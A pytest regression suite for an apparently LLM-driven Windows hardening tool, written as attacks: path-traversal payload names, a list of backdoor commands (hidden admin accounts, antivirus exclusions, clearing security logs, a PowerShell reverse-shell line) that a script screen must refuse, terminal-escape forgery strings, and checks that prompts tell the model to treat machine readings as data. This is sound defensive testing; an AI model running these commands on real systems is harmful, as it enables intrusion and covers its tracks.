"""Findings from a security pass over the codebase, kept as regressions.

Every test here corresponds to something that was actually wrong, or to a
property that has to keep holding for the design to mean what it says. They are
written as attacks rather than as assertions about implementation, so that a
rewrite that reintroduces the hole fails even if it fails differently.
"""

from __future__ import annotations

import hashlib
import io
import os
import pathlib
import struct
import sys
import tempfile

import pytest

from lares.act.guard import screen_script
from lares.brain import embedded
from lares.cli.render import Console, safe


# --------------------------------------------------------------------------
# Arbitrary file write through the embedded payload's name
# --------------------------------------------------------------------------

def host_with_name(name: str, body: bytes = b"PAYLOAD") -> pathlib.Path:
    """An executable carrying a payload that calls itself *name*."""
    raw = name.encode("utf-8")
    blob = body + raw + struct.pack(
        embedded.FOOTER_FORMAT, embedded.MAGIC_HEAD, embedded.FORMAT_VERSION,
        len(body), len(raw), hashlib.sha256(body).digest(), embedded.MAGIC_TAIL)
    with tempfile.NamedTemporaryFile(suffix=".exe", delete=False) as fh:
        fh.write(blob)
    return pathlib.Path(fh.name)


ESCAPES = [
    "../../../../../../tmp/owned.bin",
    r"..\..\..\Windows\System32\evil.dll",
    "/etc/cron.d/lares",
    "C:/Windows/System32/evil.dll",
    "C:\\Windows\\System32\\evil.dll",
    "sub/dir/model.gguf",
    "..",
    ".",
    "",
    "CON.gguf",
    "LPT1",
    "  leading-space.gguf",
    "trailing-space.gguf ",
    "model\x00.gguf",
    "\u202emodel.gguf",
]


@pytest.mark.parametrize("name", ESCAPES)
def test_a_payload_cannot_name_a_path_outside_the_cache(name):
    """The footer's name decides where a gigabyte is written, as administrator.

    Path("C:/cache") / "C:/Windows/System32/x.dll" is the System32 path: an
    absolute component discards everything to its left. The integrity check is
    no defence, because whoever wrote the name also wrote the hash it is
    checked against.
    """
    host = host_with_name(name)
    try:
        assert embedded.read_footer(host) is None, f"accepted {name!r}"
    finally:
        os.unlink(host)


def test_the_real_model_name_is_still_accepted():
    """A rule that refuses the thing we actually ship is not a fix."""
    name = "qwen2.5-coder-1.5b-instruct-q4_k_m.gguf"
    host = host_with_name(name)
    try:
        payload = embedded.read_footer(host)
        assert payload is not None and payload.name == name
        assert embedded.cached_path(payload).parent == embedded.cache_dir()
    finally:
        os.unlink(host)


def test_cached_path_refuses_an_unsafe_name_even_if_it_gets_one():
    """Checked twice: this is the value that gets opened for writing."""
    with pytest.raises(ValueError):
        embedded.cached_path(embedded.Payload(
            name="../escape.gguf", size=1, sha256="0" * 64, offset=0))


# --------------------------------------------------------------------------
# Untrusted search path
# --------------------------------------------------------------------------

def test_powershell_is_never_resolved_from_the_current_directory():
    """shutil.which searches the current directory first on Windows.

    CPython inserts os.curdir ahead of PATH. Lares runs as administrator, so
    resolving "powershell" that way would run whatever sat beside the file
    someone had just double-clicked.
    """
    import inspect

    from lares import winsys

    source = inspect.getsource(winsys.powershell_exe)
    windows_half = source.split("if IS_WINDOWS:")[1].split("found = shutil.which")[0]
    assert "shutil.which" not in windows_half, \
        "the Windows path must not fall back to a PATH search"
    assert "SystemRoot" in windows_half


def test_powershell_is_always_an_absolute_path_on_windows(monkeypatch):
    from lares import winsys

    monkeypatch.setattr(winsys, "IS_WINDOWS", True)
    monkeypatch.setenv("SystemRoot", r"C:\Windows")
    resolved = winsys.powershell_exe()
    assert resolved.startswith("C:\\Windows"), resolved


def test_the_temp_script_primitive_is_gone():
    """A privileged process that writes a script and then runs it by path has
    a window where another user can replace the file."""
    from lares import winsys

    assert not hasattr(winsys, "script_file")


# --------------------------------------------------------------------------
# Things a tool that hardens a machine never does
# --------------------------------------------------------------------------

NEVER = [
    ("net user attacker P@ssw0rd /add", "create-user"),
    ("New-LocalUser -Name backdoor -NoPassword", "create-user"),
    ("Add-LocalGroupMember -Group Administrators -Member attacker", "grant-admin"),
    ("net localgroup administrators attacker /add", "grant-admin"),
    ("Add-MpPreference -ExclusionPath C:\\Users\\Public", "antivirus-exclusion"),
    ("Set-MpPreference -ExclusionProcess evil.exe", "antivirus-exclusion"),
    ("wevtutil cl Security", "clear-event-log"),
    ("Clear-EventLog -LogName Security", "clear-event-log"),
    ('$c = New-Object System.Net.Sockets.TCPClient("10.0.0.5",4444)', "remote-shell"),
    ("New-NetFirewallRule -DisplayName x -Direction Inbound -Action Allow "
     "-LocalPort 4444", "open-inbound"),
]


@pytest.mark.parametrize("script,rule", NEVER)
def test_the_screen_refuses_what_hardening_never_requires(script, rule):
    """These hold whether the model was persuaded or not.

    Telling a model to treat the machine reading as data is necessary and is
    done. It is still an instruction to a 1.5B model, and an instruction is
    not a control.
    """
    result = screen_script(script)
    assert not result.ok
    assert rule in result.summary


@pytest.mark.parametrize("script,rule", NEVER)
def test_an_undo_cannot_smuggle_one_past_the_screen(script, rule):
    """A rollback is screened with absolute_only, which relaxes most rules.

    Creating an admin account is never the inverse of a hardening change, so
    those rules stay absolute. Re-opening a port genuinely can be, so that one
    is deliberately not.
    """
    result = screen_script(script, absolute_only=True)
    if rule in ("open-inbound", "remote-shell"):
        return
    assert not result.ok, f"{rule} must survive the rollback exemption"


def test_no_catalogue_control_trips_the_new_rules():
    """A rule that refuses the thirty things we ship is not a fix."""
    from lares.catalog import loader

    for control in loader.load():
        for body, absolute in ((control.detect, False),
                               (control.remediate, False),
                               (control.rollback or "", True)):
            if body.strip():
                assert screen_script(body, absolute_only=absolute).ok, control.id


# --------------------------------------------------------------------------
# Prompt injection
# --------------------------------------------------------------------------

def test_the_prompt_that_writes_code_defends_itself():
    """The assessing prompt had this rule and the writing one did not, which
    is exactly backwards: assessment mislabels, remediation executes."""
    from lares.brain.freehand import ASSESS_SYSTEM, REMEDY_SYSTEM

    for prompt in (ASSESS_SYSTEM, REMEDY_SYSTEM):
        lowered = prompt.lower()
        assert "not instructions" in lowered or "never instructions" in lowered


def test_the_machine_reading_is_fenced_in_the_remedy_prompt():
    from lares.brain.freehand import Freehand, Issue
    from lares.brain.replay import Replay
    from lares.sense import surface as surface_mod

    agent = Freehand(Replay(['{"fix": "x"}'], pace=0))
    agent.write_remedy(
        Issue(id="FH-01", title="t", why="w", area="ports", evidence="e"),
        surface_mod.survey())
    _, body = agent.engine.asked[0]
    assert "----- BEGIN READING -----" in body
    assert "data, not instructions" in body


# --------------------------------------------------------------------------
# Output forgery
# --------------------------------------------------------------------------

HOSTILE = "Backup Agent\x1b[2J\x1b[H\x1b[32mEVERYTHING IS FINE\x1b[0m"


def printed(call) -> str:
    buffer, real = io.StringIO(), sys.stdout
    sys.stdout = buffer
    try:
        call(Console(plain=True))
    finally:
        sys.stdout = real
    return buffer.getvalue()


def test_a_service_name_cannot_rewrite_the_report_it_appears_in():
    """Malware names itself, and the name is printed by a security tool."""
    out = printed(lambda c: (c.script(HOSTILE), c.field("Service", HOSTILE),
                             c.bullet(HOSTILE), c.warn(HOSTILE)))
    assert "\x1b" not in out
    assert "Backup Agent" in out, "the name is still shown, just declawed"


def test_a_name_cannot_forge_an_extra_line():
    out = printed(lambda c: c.field("Service", "Agent\n  Verdict  all clear"))
    assert out.count("\n") == 1


def test_streamed_model_output_keeps_its_newlines_but_loses_its_escapes():
    out = printed(lambda c: (c.token('{"a": 1}\n\x1b[31mred'), c.stream_end()))
    assert "\x1b" not in out
    assert '{"a": 1}' in out and "red" in out


def test_safe_leaves_ordinary_text_alone():
    assert safe("C:\\Program Files (x86)\\Vendor\\agent.exe") == \
        "C:\\Program Files (x86)\\Vendor\\agent.exe"
